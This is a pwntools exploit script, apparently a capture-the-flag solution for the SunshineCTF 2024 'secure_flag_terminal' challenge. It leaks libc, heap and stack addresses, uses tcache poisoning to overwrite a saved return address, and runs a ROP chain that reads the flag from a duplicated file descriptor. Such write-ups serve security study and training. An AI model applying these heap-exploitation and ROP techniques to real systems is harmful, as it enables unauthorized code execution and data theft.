#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './secure_flag_terminal')
libc = ELF(exe.libc.path)

host = args.HOST or '2024.sunshinectf.games'
port = int(args.PORT or 24002)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, aslr=False, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x555555400fba
b *0x555555401137
b *0x55555540151e
b *0x555555400fec
b *0x55555540176e
c
'''.format(**locals())

context.terminal = "tmux splitw -h".split()
if args.GDB:
    context.log_level = "debug"

io = start()

if args.GDB:
    io.recvuntil(b"Seed: ")
    xor = 0xd3c0dead

    kSeed_addr = int( io.recvline()[:-1], 16)
    kseed = xor ^ kSeed_addr
    libc.address = kseed - 0x44390
    stack_on_libc = kseed + 0x3a8170
    
else:
    io.recvuntil(b'Seed: 0x')
    libc.address = int(io.recvline().strip(), 16) - libc.sym['rand']

binsh = next(libc.search(b'/bin/sh'))

def malloc(size):
    io.sendlineafter(b": ", b"1")
    io.sendlineafter(b"--> ", str(size).encode())

def free(idx):
    io.sendlineafter(b": ", b"4")
    io.sendlineafter(b"remove --> ", str(idx).encode())

def write(idx, msg):
    io.sendlineafter(b": ", b"2")
    io.sendlineafter(b"edit --> ", str(idx).encode())
    io.sendlineafter(b"flag --> ", msg)

def read(idx):
    io.sendlineafter(b": ", b"3")
    io.sendlineafter(b"view --> ", str(idx).encode())

# the fd dup in ( 0x555555607270 ) offset from leaked ( 0x5555556072b0 ) is 0x40

malloc(0x10)
malloc(0x10)
free(2) # 0x5555556072b0
free(1) # 0x555555607290
malloc(0x10)

# Leak Heap addr
read(1)
io.recvuntil(b"=====\n\n")
heap_addr = u64(io.recvline()[:-1].ljust(8, b"\x00")) - 0x12b0

dup_fd_addr = heap_addr + 0x1270 # read the content from dup_fd addr

malloc(0x10)
malloc(0x10)
free(3) # 0x5555556072d0
free(2) # 0x5555556072b0
dup_payload = p64(0)*3 + p64(0x21) + p64(dup_fd_addr)
write(1, dup_payload)
malloc(0x10)
malloc(0x10) # 3 -> the dup fd addr value
read(3)
io.recvuntil(b'=====\n\n')
dup_fd = u64(io.recvline().strip().ljust(8, b'\x00'))

free(3)
free(2)
free(1)

malloc(0x20)
malloc(0x20)
malloc(0x20)
free(3)
free(2)
pay = p64(0)*5 + p64(0x31) + p64( libc.sym['environ'] )
write(1, pay)
malloc(0x20)
malloc(0x20)
read(3)
io.recvuntil(b'=====\n\n')
stack_addr = u64(io.recvline().strip().ljust(8, b'\x00'))
rip = stack_addr - 0x120

# control the RIP, becareful of the freeing to avoid crash
# free(3)
free(2)
free(1)

malloc(0x30)
malloc(0x30)
malloc(0x30)
free(4)
free(3)
pay = p64(0x0)*7 + p64(0x41) + p64(rip)
write(2, pay)
malloc(0x30)
malloc(0x30)

rop = ROP(libc)
rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]

chain = flat([
    rdi, dup_fd,
    rsi, heap_addr+0x500,
    rdx, 0x100,
    rax, 0,
    syscall,

    rdi, 1,
    rax, 1,
    syscall
])

write(4, chain)

# Logs
print(f"-> Heap @ {hex(heap_addr)}")
print(f"-> dup fd addr @ {hex(dup_fd_addr)}")
print(f"-> dup fd value @ {hex(dup_fd)}")
print(f"-> stack addr @ {hex(stack_addr)}")
print(f"-> rip @ {hex(rip)}")

io.interactive()
